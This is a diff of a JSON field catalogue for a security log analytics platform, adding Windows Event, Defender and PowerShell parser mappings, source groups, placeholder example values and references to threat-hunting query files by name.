       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "SERVER"
@@ -10733,7 +12183,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "HTTP GET /crm/orders/:id"
@@ -10759,6 +12210,18 @@
       ],
       "parsers": [
         {
+          "parser_name": "socWinEventSecurityJsonParser",
+          "parser_display": "SOC Windows Event Security JSON Parser",
+          "sequence": 27,
+          "raw_json_path": "$.Status"
+        },
+        {
+          "parser_name": "socWindowsDefenderOperationalJsonParser",
+          "parser_display": "SOC Windows Defender Operational JSON Parser",
+          "sequence": 12,
+          "raw_json_path": "$.Status"
+        },
+        {
           "parser_name": "socMulticloudHealthJsonParser",
           "parser_display": "SOC Multicloud Health JSON Parser",
           "sequence": 17,
@@ -10767,24 +12230,38 @@
       ],
       "sources": [
         {
+          "source_internal": "socWinEventSecuritySource",
+          "source_display": "Windows Event Security Logs"
+        },
+        {
+          "source_internal": "socWindowsDefenderOperationalSource",
+          "source_display": "Windows Defender Operational Logs"
+        },
+        {
           "source_internal": "socMulticloudHealthSource",
           "source_display": "SOC Multicloud Health Logs"
         }
       ],
       "source_candidate_groups": [
-        "multicloud_health"
+        "multicloud_health",
+        "windows_defender_operational",
+        "windows_event_security"
       ],
       "example_values": [
+        "0xC000006D",
+        "Active",
         "healthy"
       ],
       "contract_datasets": [
-        "multicloud_health.jsonl"
+        "multicloud_health.jsonl",
+        "windows_defender_operational.jsonl"
       ],
       "queries_using_it": [
         "hunting/multicloud_geo_health_by_provider.json",
         "hunting/multicloud_geo_health_regional_map.json",
         "hunting/multicloud_geo_health_tier_status.json",
-        "hunting/multicloud_geo_health_unhealthy_regions.json"
+        "hunting/multicloud_geo_health_unhealthy_regions.json",
+        "windows_defender_malware_or_remediation_event.json"
       ],
       "dashboards_using_it": [],
       "reserved_backing_field": ""
@@ -10850,9 +12327,42 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [],
+      "contract_datasets": [],
+      "queries_using_it": [],
+      "dashboards_using_it": [],
+      "reserved_backing_field": ""
+    },
+    {
+      "display_name": "Sub Status",
+      "kind": "custom",
+      "type": "STRING",
+      "raw_json_paths": [
+        "$.SubStatus"
+      ],
+      "parsers": [
+        {
+          "parser_name": "socWinEventSecurityJsonParser",
+          "parser_display": "SOC Windows Event Security JSON Parser",
+          "sequence": 28,
+          "raw_json_path": "$.SubStatus"
+        }
+      ],
+      "sources": [
+        {
+          "source_internal": "socWinEventSecuritySource",
+          "source_display": "Windows Event Security Logs"
+        }
+      ],
+      "source_candidate_groups": [
+        "windows_event_security"
+      ],
+      "example_values": [
+        "0xC000006A"
+      ],
       "contract_datasets": [],
       "queries_using_it": [],
       "dashboards_using_it": [],
@@ -10976,7 +12486,8 @@
         "hunting/bluelight_top_affected_hosts.json",
         "hunting/bluelight_total_detections_kpi.json",
         "hunting/goad_caldera_sandcat_activity.json",
-        "sentinel/cve-2019-0808-nufsys-file_creation.json"
+        "sentinel/cve-2019-0808-nufsys-file_creation.json",
+        "sysmon_executable_file_created_or_detected.json"
       ],
       "dashboards_using_it": [],
       "reserved_backing_field": ""
@@ -11132,7 +12643,46 @@
       ],
       "contract_datasets": [],
       "queries_using_it": [
-        "lateral_movement_logon_pattern.json"
+        "hunting/logon_anomaly_by_account.json",
+        "lateral_movement_logon_pattern.json",
+        "windows_account_or_group_enumeration_spike.json",
+        "windows_kerberos_pre_authentication_failures.json",
+        "windows_ntlm_authentication_failures.json",
+        "windows_privileged_group_membership_change_event.json"
+      ],
+      "dashboards_using_it": [],
+      "reserved_backing_field": ""
+    },
+    {
+      "display_name": "Task Name",
+      "kind": "custom",
+      "type": "STRING",
+      "raw_json_paths": [
+        "$.TaskName"
+      ],
+      "parsers": [
+        {
+          "parser_name": "socWinEventSecurityJsonParser",
+          "parser_display": "SOC Windows Event Security JSON Parser",
+          "sequence": 29,
+          "raw_json_path": "$.TaskName"
+        }
+      ],
+      "sources": [
+        {
+          "source_internal": "socWinEventSecuritySource",
+          "source_display": "Windows Event Security Logs"
+        }
+      ],
+      "source_candidate_groups": [
+        "windows_event_security"
+      ],
+      "example_values": [
+        "\\Microsoft\\Windows\\Update\\CacheTask"
+      ],
+      "contract_datasets": [],
+      "queries_using_it": [
+        "windows_scheduled_task_created_or_updated_event.json"
       ],
       "dashboards_using_it": [],
       "reserved_backing_field": ""
@@ -11234,13 +12784,52 @@
       "reserved_backing_field": ""
     },
     {
+      "display_name": "Threat ID",
+      "kind": "custom",
+      "type": "STRING",
+      "raw_json_paths": [
+        "$.ThreatID"
+      ],
+      "parsers": [
+        {
+          "parser_name": "socWindowsDefenderOperationalJsonParser",
+          "parser_display": "SOC Windows Defender Operational JSON Parser",
+          "sequence": 10,
+          "raw_json_path": "$.ThreatID"
+        }
+      ],
+      "sources": [
+        {
+          "source_internal": "socWindowsDefenderOperationalSource",
+          "source_display": "Windows Defender Operational Logs"
+        }
+      ],
+      "source_candidate_groups": [
+        "windows_defender_operational"
+      ],
+      "example_values": [
+        "2147712345"
+      ],
+      "contract_datasets": [],
+      "queries_using_it": [],
+      "dashboards_using_it": [],
+      "reserved_backing_field": ""
+    },
+    {
       "display_name": "Threat Name",
       "kind": "custom",
       "type": "STRING",
       "raw_json_paths": [
+        "$.ThreatName",
         "$.logContent.data.threatid"
       ],
       "parsers": [
+        {
+          "parser_name": "socWindowsDefenderOperationalJsonParser",
+          "parser_display": "SOC Windows Defender Operational JSON Parser",
+          "sequence": 9,
+          "raw_json_path": "$.ThreatName"
+        },
         {
           "parser_name": "socNetworkFirewallJsonParser",
           "parser_display": "SOC Network Firewall JSON Parser",
@@ -11250,17 +12839,25 @@
       ],
       "sources": [
         {
+          "source_internal": "socWindowsDefenderOperationalSource",
+          "source_display": "Windows Defender Operational Logs"
+        },
+        {
           "source_internal": "socNetworkFirewallSource",
           "source_display": "SOC Network Firewall Logs"
         }
       ],
       "source_candidate_groups": [
-        "network_firewall"
+        "network_firewall",
+        "windows_defender_operational"
       ],
       "example_values": [
+        "Trojan:Win32/Example",
         "Suspicious Data Exfiltration"
       ],
-      "contract_datasets": [],
+      "contract_datasets": [
+        "windows_defender_operational.jsonl"
+      ],
       "queries_using_it": [
         "hunting/c2_affected_hosts_kpi.json",
         "hunting/c2_beacon_activity_timeline.json",
@@ -11279,7 +12876,8 @@
         "hunting/web_to_cloud_exfiltration.json",
         "hunting/web_to_cloud_firewall_c2.json",
         "hunting/web_to_cloud_mitre_sunburst.json",
-        "sentinel/mcafee_epo_-_multiple_threats_on_same_host.json"
+        "sentinel/mcafee_epo_-_multiple_threats_on_same_host.json",
+        "windows_defender_malware_or_remediation_event.json"
       ],
       "dashboards_using_it": [],
       "reserved_backing_field": ""
@@ -11393,9 +12991,9 @@
         "$.Timestamp",
         "$.TimeCreated",
         "$.timeFirstDetected",
+        "$.timestamp",
         "$.@timestamp",
         "$.timeCreated",
-        "$.timestamp",
         "$.time",
         "$.logContent.time"
       ],
@@ -11419,6 +13017,12 @@
           "raw_json_path": "$.timeFirstDetected"
         },
         {
+          "parser_name": "socCloudGuardInstanceSecurityJsonParser",
+          "parser_display": "SOC Cloud Guard Instance Security JSON Parser",
+          "sequence": 2,
+          "raw_json_path": "$.timestamp"
+        },
+        {
           "parser_name": "socWinEventSecurityJsonParser",
           "parser_display": "SOC Windows Event Security JSON Parser",
           "sequence": 2,
@@ -11427,6 +13031,18 @@
         {
           "parser_name": "socWinEventSystemJsonParser",
           "parser_display": "SOC Windows Event System JSON Parser",
+          "sequence": 2,
+          "raw_json_path": "$.TimeCreated"
+        },
+        {
+          "parser_name": "socWinPowerShellOperationalJsonParser",
+          "parser_display": "SOC Windows PowerShell Operational JSON Parser",
+          "sequence": 2,
+          "raw_json_path": "$.TimeCreated"
+        },
+        {
+          "parser_name": "socWindowsDefenderOperationalJsonParser",
+          "parser_display": "SOC Windows Defender Operational JSON Parser",
           "sequence": 2,
           "raw_json_path": "$.TimeCreated"
         },
@@ -11505,12 +13121,24 @@
           "source_display": "SOC Cloud Guard Logs"
         },
         {
+          "source_internal": "socCloudGuardInstanceSecuritySource",
+          "source_display": "SOC Cloud Guard Instance Security Logs"
+        },
+        {
           "source_internal": "socWinEventSecuritySource",
           "source_display": "Windows Event Security Logs"
         },
         {
           "source_internal": "socWinEventSystemSource",
           "source_display": "Windows Event System Logs"
+        },
+        {
+          "source_internal": "socWinPowerShellOperationalSource",
+          "source_display": "Windows PowerShell Operational Logs"
+        },
+        {
+          "source_internal": "socWindowsDefenderOperationalSource",
+          "source_display": "Windows Defender Operational Logs"
         },
         {
           "source_internal": "socLinuxSecureSource",
@@ -11555,24 +13183,32 @@
       ],
       "source_candidate_groups": [
         "application_logs",
+        "azure_log_analytics_custom",
         "cloud_guard",
+        "cloud_guard_instance_security",
         "lb_access",
         "linux_secure",
         "linux_syslog",
         "multicloud_health",
         "network_firewall",
+        "osquery_results",
         "sysmon_network",
         "sysmon_operational",
         "vcn_flow",
         "waf_security",
         "webapp_security",
+        "windows_defender_operational",
         "windows_event_security",
         "windows_event_system",
+        "windows_powershell_operational",
         "windows_sysmon"
       ],
       "example_values": [
         "2026-02-10T10:30:00.000Z",
+        "2026-05-28T10:30:00.000Z",
         "2026-02-11T10:30:00.000Z",
+        "2026-05-29T10:30:00.000Z",
+        "2026-05-29T10:35:00.000Z",
         "2026-02-15T14:30:00.000Z",
         "2026-03-18T09:07:04.446Z",
         "2026-05-04T10:15:00.000Z",
@@ -11591,8 +13227,10 @@
         "vcn_flow.jsonl",
         "waf_security.jsonl",
         "webapp_security.jsonl",
+        "windows_defender_operational.jsonl",
         "windows_event_security.jsonl",
         "windows_event_system.jsonl",
+        "windows_powershell_operational.jsonl",
         "windows_sysmon.jsonl"
       ],
       "queries_using_it": [],
@@ -11693,6 +13331,7 @@
       ],
       "source_candidate_groups": [
         "application_logs",
+        "azure_log_analytics_custom",
         "lb_access",
         "network_firewall",
         "vcn_flow",
@@ -11736,6 +13375,14 @@
         "apps/app_order_sync_pipeline.json",
         "apps/app_request_rate_by_endpoint.json",
         "apps/app_slow_requests.json",
+        "apps/oke_boopkit_attack_timeline.json",
+        "apps/oke_ebpf_rootkit_activity.json",
+        "apps/oke_exec_and_node_escape.json",
+        "apps/oke_kubernetes_attack_overview.json",
+        "apps/oke_kubernetes_attack_path_link.json",
+        "apps/oke_privileged_workload_creation.json",
+        "apps/oke_rule_boopkit_ebpf_rootkit_count.json",
+        "apps/oke_secrets_and_rbac_abuse.json",
         "hunting/clickfix_clipboard_powershell_execution.json",
         "hunting/clickfix_lolbin_payload_execution.json",
         "hunting/cloud_identity_aitm_token_abuse.json",
@@ -11784,7 +13431,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "00-trace_demo_cross_service_001-span_demo_root_001-01"
@@ -11825,7 +13473,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [],
       "contract_datasets": [],
@@ -11926,6 +13575,7 @@
       ],
       "source_candidate_groups": [
         "application_logs",
+        "azure_log_analytics_custom",
         "lb_access",
         "waf_security",
         "webapp_security"
@@ -11980,7 +13630,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "/crm/orders/42"
@@ -12023,6 +13674,18 @@
           "parser_name": "socWinEventSystemJsonParser",
           "parser_display": "SOC Windows Event System JSON Parser",
           "sequence": 7,
+          "raw_json_path": "$.User"
+        },
+        {
+          "parser_name": "socWinPowerShellOperationalJsonParser",
+          "parser_display": "SOC Windows PowerShell Operational JSON Parser",
+          "sequence": 6,
+          "raw_json_path": "$.User"
+        },
+        {
+          "parser_name": "socWindowsDefenderOperationalJsonParser",
+          "parser_display": "SOC Windows Defender Operational JSON Parser",
+          "sequence": 6,
           "raw_json_path": "$.User"
         },
         {
@@ -12074,6 +13737,14 @@
           "source_display": "Windows Event System Logs"
         },
         {
+          "source_internal": "socWinPowerShellOperationalSource",
+          "source_display": "Windows PowerShell Operational Logs"
+        },
+        {
+          "source_internal": "socWindowsDefenderOperationalSource",
+          "source_display": "Windows Defender Operational Logs"
+        },
+        {
           "source_internal": "socLinuxSecureSource",
           "source_display": "Linux Secure Logs"
         },
@@ -12096,13 +13767,16 @@
       ],
       "source_candidate_groups": [
         "application_logs",
+        "azure_log_analytics_custom",
         "linux_secure",
         "linux_syslog",
         "sysmon_network",
         "sysmon_operational",
         "webapp_security",
+        "windows_defender_operational",
         "windows_event_security",
         "windows_event_system",
+        "windows_powershell_operational",
         "windows_sysmon"
       ],
       "example_values": [
@@ -12110,6 +13784,7 @@
         "CORP\\admin",
         "joffrey",
         "SYSTEM",
+        "arya",
         "anonymous",
         "cersei"
       ],
@@ -12188,6 +13863,7 @@
       ],
       "source_candidate_groups": [
         "application_logs",
+        "azure_log_analytics_custom",
         "lb_access",
         "waf_security",
         "webapp_security"
@@ -12241,7 +13917,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "usr_demo_hash_001"
@@ -12313,7 +13990,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [],
       "contract_datasets": [],
@@ -12394,6 +14072,7 @@
       ],
       "source_candidate_groups": [
         "application_logs",
+        "azure_log_analytics_custom",
         "waf_security"
       ],
       "example_values": [
@@ -12461,7 +14140,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "88"
@@ -12495,7 +14175,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "crm-order-sync"
@@ -12534,7 +14215,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "order-detail"
@@ -12548,7 +14230,8 @@
         "apps/apm_octo_metric_samples.json",
         "apps/apm_octo_red_metrics.json",
         "apps/apm_octo_span_latency_hotspots.json",
-        "apps/apm_octo_trace_logs_correlation.json"
+        "apps/apm_octo_trace_logs_correlation.json",
+        "apps/oke_boopkit_attack_timeline.json"
       ],
       "dashboards_using_it": [],
       "reserved_backing_field": ""
